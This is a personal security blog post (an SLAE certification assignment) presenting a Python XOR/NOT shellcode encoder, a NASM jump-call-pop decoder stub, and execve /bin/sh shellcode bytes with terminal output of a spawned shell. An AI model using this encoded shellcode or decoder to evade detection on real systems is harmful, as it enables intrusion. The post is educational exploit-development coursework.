@@ -1,0 +1,418 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>SLAE Assignment 4 &#8211; rtmcx</title>
+<meta name="description" content="SLAE Assignment 4 - Custom encoder">
+<meta name="keywords" content="asm, code, slae">
+
+
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SLAE Assignment 4">
+<meta property="og:description" content="SLAE Assignment 4 - Custom encoder">
+<meta property="og:url" content="https://rtmcx.github.io/SLAE-Assignment-4/">
+<meta property="og:site_name" content="rtmcx">
+
+
+
+
+
+<link rel="canonical" href="https://rtmcx.github.io/SLAE-Assignment-4/">
+<link href="https://rtmcx.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="rtmcx Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://rtmcx.github.io/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="https://rtmcx.github.io/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://rtmcx.github.io/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://rtmcx.github.io/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://rtmcx.github.io/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://rtmcx.github.io/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+</head>
+
+<body id="post" class="feature">
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="https://rtmcx.github.io/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="https://rtmcx.github.io/images/CatEye.jpg" alt="rtmcx photo" class="author-photo">
+					<h4>rtmcx</h4>
+					<p>Pentester. OSCP. Aspiring shellcoder and malware analyst</p>
+				</li>
+				<li><a href="https://rtmcx.github.io/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:rtmcx@protonmail.com"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				
+				
+				
+				
+				
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="https://rtmcx.github.io/posts/">All Posts</a></li>
+				<li><a href="https://rtmcx.github.io/tags/">All Tags</a></li>
+			</ul>
+		</li>
+		
+	    
+	    <li><a href="http://www.twitter.com/rtmcx" target="_blank">Twitter</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+<div class="entry-header">
+  
+  <div class="entry-image">
+    <img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 4">
+  </div><!-- /.entry-image -->
+</div><!-- /.entry-header -->
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-4/" rel="bookmark" title="SLAE Assignment 4">SLAE Assignment 4</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2017-04-29T00:00:00+00:00">April 29, 2017</time></span></h2>
+        
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+Reading time ~4 minutes
+        </p><!-- /.entry-reading-time -->
+        
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <h1 id="requirements">Requirements</h1>
+
+<ul>
+  <li>Create a custom encoding scheme like the “Insertion Encoder” we showed you</li>
+  <li>PoC with using execve­‐stack as the shellcode to encode with your schema and execute</li>
+</ul>
+
+<h2 id="custom-encoder">Custom encoder</h2>
+
+<p>So the encoder schema i will implement is this:</p>
+
+<p>Every other byte in the shellcode will be XOR-encoded (using different values with each byte), and every other byte will be “inverted” using the NOT-encoding.</p>
+
+<p>A step-by-step explanation:</p>
+<ol>
+  <li>Start by getting the length of the shellcode. Store this value in a variable (here called counter).</li>
+  <li>Take the first byte in the shellcode and XOR-encode with the value of counter. So for example, if the length of the shellcode is 25 bytes, the first XOR-value will be 0x19. Decrement counter.</li>
+  <li>Go to next byte in the shellcode and NOT-encode it. Decrement counter.</li>
+  <li>Take the next byte in the shellcode and XOR-encode with the value of counter. Decrement counter.</li>
+  <li>Go to next byte in the shellcode and NOT-encode it. Decrement counter.</li>
+  <li>Continue until the entire shellcode is decoded.</li>
+</ol>
+
+<p>Next step is to create a encoder-script:</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>
+
+<span class="c"># The shellcode to be encoded</span>
+<span class="c"># Execve //bin/sh</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62</span><span class="s">"</span>
+             <span class="s">"</span><span class="se">\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">)</span>
+
+
+<span class="c"># We will output the encoded shellcode in two formats:</span>
+<span class="c"># \x00 and 0x00 for use in different situations</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">encoded2</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">print</span> <span class="s">"Encoding shellcode..."</span>
+<span class="n">shellcode_length</span> <span class="o">=</span>  <span class="nb">len</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+
+<span class="n">counter</span> <span class="o">=</span> <span class="n">shellcode_length</span>
+
+<span class="c"># Loop through each byte and encode it</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
+        <span class="c"># Odd or even position</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">counter</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">):</span>
+                <span class="c"># Odd, NOT-encode</span>
+                <span class="n">y</span> <span class="o">=</span> <span class="o">~</span><span class="n">x</span>                  
+        <span class="k">else</span><span class="p">:</span>
+                <span class="c"># XOR the byte with the hex value of 'counter'</span>
+                <span class="n">y</span> <span class="o">=</span> <span class="n">x</span><span class="o">^</span><span class="n">counter</span>                          
+
+        <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">y</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="c"># Make the byte positive</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">byte</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
+                <span class="k">print</span> <span class="s">"[!] NULL byte detected in encoded shellcode, aborting!"</span>
+                <span class="k">print</span> <span class="s">"[!] Please alter the input shellcode so that the encoded shellcode is NULL-free!"</span>
+                <span class="k">print</span> <span class="s">"[!] The byte position is the </span><span class="si">%</span><span class="s">d:th byte"</span> <span class="o">%</span> <span class="p">(</span><span class="n">shellcode_length</span><span class="o">-</span> <span class="n">counter</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+                <span class="c">#break</span>
+                <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+
+
+        <span class="n">encoded</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\\</span><span class="s">x"</span>
+        <span class="n">encoded</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%02</span><span class="s">x"</span> <span class="o">%</span> <span class="n">byte</span>
+
+        <span class="n">encoded2</span> <span class="o">+=</span> <span class="s">"0x"</span>
+        <span class="n">encoded2</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%02</span><span class="s">x,"</span> <span class="o">%</span> <span class="n">byte</span>
+        <span class="n">counter</span> <span class="o">=</span> <span class="n">counter</span> <span class="o">-</span> <span class="mi">1</span>
+
+<span class="k">print</span> <span class="n">encoded</span>
+<span class="k">print</span> <span class="n">encoded2</span>
+
+<span class="k">print</span> <span class="s">"Length: </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="n">shellcode_length</span> <span class="c">#len(bytearray(shellcode))</span>
+
+</code></pre>
+</div>
+
+<p>Run the encoder:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>./NOTXOR-encoder.py 
+Encoding shellcode...
+<span class="se">\x</span>ce<span class="se">\x</span>d8<span class="se">\x</span>af<span class="se">\x</span>73e<span class="se">\x</span>91<span class="se">\x</span>3b<span class="se">\x</span>8c<span class="se">\x</span>7a<span class="se">\x</span>97<span class="se">\x</span>3f<span class="se">\x</span>d0<span class="se">\x</span>6c<span class="se">\x</span>96<span class="se">\x</span>85<span class="se">\x</span>1c<span class="se">\x</span>5a<span class="se">\x</span>76<span class="se">\x</span>ea<span class="se">\x</span>ac<span class="se">\x</span>8f<span class="se">\x</span>1e<span class="se">\x</span>b4<span class="se">\x</span>f4<span class="se">\x</span>cf<span class="se">\x</span>7f
+0xce,0xd8,0xaf,0x7e,0x91,0x3b,0x8c,0x7a,0x97,0x3f,0xd0,0x6c,0x96,0x85,0x1c,0x5a,0x76,0xea,0xac,0x8f,0x1e,0xb4,0xf4,0xcf,0x7f,
+Length: 25
+rtmcx@parrot <span class="nv">$ </span>
+</code></pre>
+</div>
+
+<p>So the the shellcode went from this:<br />
+\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</p>
+
+<p>to this:<br />
+\xce\xd8\xaf\x73e\x91\x3b\x8c\x7a\x97\x3f\xd0\x6c\x96\x85\x1c\x5a\x76\xea\xac\x8f\x1e\xb4\xf4\xcf\x7f</p>
+
+<h2 id="decoder">Decoder</h2>
+
+<p>Next step is to write the decoder in asm.</p>
+
+<p>The steps to be performed are:</p>
+<ol>
+  <li>Put the shellcode in esi, by using the “Jump-Call-Pop”-method.</li>
+  <li>Put the length of the shellcode in ecx (for the counter)</li>
+  <li>Loop over every byte and decode the byte in the appropriate way.</li>
+  <li>When we have decoded the entire shellcode, pass execution to the decoded shellcode.</li>
+</ol>
+
+<h4 id="to-xor-or-not-to-xor">To XOR or NOT to XOR</h4>
+<p>So the big question here is, how do we determine which operation to use, AND or XOR? 
+In the decoder, the modulos-operator was used and we need to implement that in the decoder also.</p>
+
+<p>As in the encoder, the first value to use in XOR-decoding is the value of the length of the shellcode (here 25, or 0x19).</p>
+
+<p>Put this value in edx and AND the value with 1. 
+If the value is even, the result will be 0, and the ZERO-flag will be set. 
+If the value is odd, the ZERO-flag will not be set.</p>
+
+<p><b>Small examples</b></p>
+
+<table style="width: 200px; border:1px solid;">
+<tr>
+        <th colspan="2">Even value</th>
+</tr>
+
+<tr>
+        <td>Value</td>
+        <td>0110</td>
+</tr>
+<tr>
+        <td>AND</td>
+        <td>0001</td>
+</tr>
+<tr>
+        <td>Result</td>
+        <td>0000</td>
+</tr>
+</table>
+<p>Result is 0, and the ZERO-flag will be set.</p>
+
+<table style="width: 300px; border:1px solid;">
+<tr>
+        <th colspan="2">Odd value</th>
+</tr>
+<tr>
+        <td>Value</td>
+        <td>0101</td>
+</tr>
+<tr>
+        <td>AND</td>
+        <td>0001</td>
+</tr>
+<tr>
+        <td>Result</td>
+        <td>0001</td>
+</tr>
+</table>
+<p>Result is 1, and the ZERO-flag will be not be set.</p>
+
+<p>Then it’s just a matter of checking if the result is 1 or 0 and jump to the operation for the byte.</p>
+
+<p>Here is the full, commented, code</p>
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="kr">global</span> <span class="n">_start</span>
+
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+<span class="n">_start</span><span class="o">:</span>
+        <span class="c">; Put shellcode on stack by "jump-call-pop"</span>
+        <span class="k">jmp</span> <span class="n">short</span> <span class="n">push_shellcode</span>
+
+<span class="n">decoder</span><span class="o">:</span>
+        <span class="k">pop</span> <span class="n">esi</span>                 <span class="c">; Put shellcode-address in esi</span>
+
+        <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>            <span class="c">; zero out ecx</span>
+        <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="n">sc_length</span>       <span class="c">; length of shellcode, used as counter</span>
+<span class="n">decode</span><span class="o">:</span>
+        <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ecx</span>            <span class="c">; put the value of counter in edx</span>
+        <span class="k">and</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">1</span>              <span class="c">; (Byte position) modulo 2</span>
+
+        <span class="k">cmp</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">1</span>              <span class="c">; is it odd?</span>
+        <span class="k">je</span> <span class="n">not_decode</span>           <span class="c">; No, even, so this is a "Not"</span>
+
+        <span class="k">xor</span> <span class="n">byte</span> <span class="p">[esi],</span> <span class="n">cl</span>      <span class="c">; Odd, "XOR"</span>
+        <span class="k">jmp</span> <span class="n">next_byte</span>           <span class="c">; Step over the "not"-decode for this byte</span>
+
+<span class="n">not_decode</span><span class="o">:</span>
+        <span class="k">not</span> <span class="n">byte</span> <span class="p">[esi]</span>          <span class="c">; 'NOT'-decode</span>
+
+<span class="n">next_byte</span><span class="o">:</span>
+        <span class="k">inc</span> <span class="n">esi</span>                 <span class="c">; next byte</span>
+        <span class="k">loop</span> <span class="n">decode</span>             <span class="c">; loop until all bytes in array</span>
+
+        <span class="k">jmp</span> <span class="n">short</span> <span class="n">shellcode</span>     <span class="c">; All decoded, Jump to decoded shellcode and exec...</span>
+
+<span class="n">push_shellcode</span><span class="o">:</span>
+        <span class="k">call</span> <span class="n">decoder</span>
+        <span class="n">shellcode</span><span class="o">:</span> <span class="kt">db</span> <span class="mh">0xce</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">,</span><span class="mh">0xaf</span><span class="p">,</span><span class="mh">0x7e</span><span class="p">,</span><span class="mh">0x91</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x8c</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span>
+        <span class="mh">0x96</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0xea</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span><span class="mh">0x8f</span><span class="p">,</span><span class="mh">0x1e</span><span class="p">,</span><span class="mh">0xb4</span><span class="p">,</span><span class="mh">0xf4</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0x7f</span>
+        <span class="n">sc_length</span> <span class="k">equ</span> <span class="err">$</span><span class="o">-</span><span class="n">shellcode</span>
+</code></pre>
+</div>
+
+<p>Compile and execute the decoder</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>./compile.sh notxor
+<span class="o">[</span><span class="k">***</span><span class="o">]</span> Compiling with nasm...
+<span class="o">[</span><span class="k">***</span><span class="o">]</span> Linking with ld...
+
+<span class="o">[</span><span class="k">***</span><span class="o">]</span> Extracted shellcode:
+<span class="se">\x</span>eb<span class="se">\x</span>1a<span class="se">\x</span>5e<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>b1<span class="se">\x</span>19<span class="se">\x</span>89<span class="se">\x</span>ca<span class="se">\x</span>83<span class="se">\x</span>e2<span class="se">\x</span>01<span class="se">\x</span>83<span class="se">\x</span>fa<span class="se">\x</span>01<span class="se">\x</span>74<span class="se">\x</span>04<span class="se">\x</span>30<span class="se">\x</span>0e<span class="se">\x</span>eb<span class="se">\x</span>02<span class="se">\x</span>f6<span class="se">\x</span>16<span class="se">\x</span>46<span class="se">\x</span>e2<span class="se">\x</span>ed<span class="se">\x</span>eb<span class="se">\x</span>05<span class="se">\x</span>e8<span class="se">\x</span>e1<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ce<span class="se">\x</span>d8<span class="se">\x</span>af<span class="se">\x</span>7e<span class="se">\x</span>91<span class="se">\x</span>3b<span class="se">\x</span>8c<span class="se">\x</span>7a<span class="se">\x</span>97<span class="se">\x</span>3f<span class="se">\x</span>d0<span class="se">\x</span>6c<span class="se">\x</span>96<span class="se">\x</span>85<span class="se">\x</span>1c<span class="se">\x</span>5a<span class="se">\x</span>76<span class="se">\x</span>ea<span class="se">\x</span>ac<span class="se">\x</span>8f<span class="se">\x</span>1e<span class="se">\x</span>b4<span class="se">\x</span>f4<span class="se">\x</span>cf<span class="se">\x</span>7f
+
+<span class="o">[</span><span class="k">***</span> DONE <span class="k">***</span><span class="o">]</span>
+
+rtmcx@parrot <span class="nv">$ </span>./shellcode-notxor 
+Shellcode length: 58
+<span class="gp">$ </span>
+</code></pre>
+</div>
+
+<p>Success! The encoded shellcode is decoded and execution passed to the decoded shellcode.</p>
+
+<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>
+
+<hr />
+
+<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>
+
+<p>Student ID: PA-0726</p>
+
+      <footer class="entry-meta">
+        <span class="entry-tags"><a href="https://rtmcx.github.io/tags/#asm" title="Pages tagged asm" class="tag"><span class="term">asm</span></a><a href="https://rtmcx.github.io/tags/#code" title="Pages tagged code" class="tag"><span class="term">code</span></a><a href="https://rtmcx.github.io/tags/#slae" title="Pages tagged slae" class="tag"><span class="term">slae</span></a></span>
+        <span>Updated on <span class="entry-date date updated"><time datetime="2017-04-29 21:28:20 +0000">April 29, 2017</time></span></span>
+        <span class="author vcard"><span class="fn">rtmcx</span></span>
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://rtmcx.github.io/SLAE-Assignment-4/" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://rtmcx.github.io/SLAE-Assignment-4/" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://rtmcx.github.io/SLAE-Assignment-4/" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      <a href="https://rtmcx.github.io/SLAE-Assignment-3/" class="read-more-btn">Read More</a>
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      <h3><a href="https://rtmcx.github.io/SLAE-Assignment-7/" title="SLAE Assignment 7">SLAE Assignment 7</a></h3>
+      <p>SLAE Assignment 7 - Custom crypter <a href="https://rtmcx.github.io/SLAE-Assignment-7/">Continue reading</a></p>
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      <div class="list-item">
+        <h4><a href="https://rtmcx.github.io/SLAE-Assignment-6/" title="SLAE Assignment 6">SLAE Assignment 6</a></h4>
+        <span>Published on May 09, 2017</span>
+      </div><!-- /.list-item -->
+    
+      <div class="list-item">
+        <h4><a href="https://rtmcx.github.io/SLAE-Assignment-5_3/" title="SLAE Assignment 5 (3/3)">SLAE Assignment 5 (3/3)</a></h4>
+        <span>Published on May 06, 2017</span>
+      </div><!-- /.list-item -->
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2017 rtmcx. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/hpstr-jekyll-theme/" rel="nofollow">HPSTR Theme</a>.</span>
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://rtmcx.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://rtmcx.github.io/assets/js/scripts.min.js"></script>
+
+
+
+	        
+
+</body>
+</html>
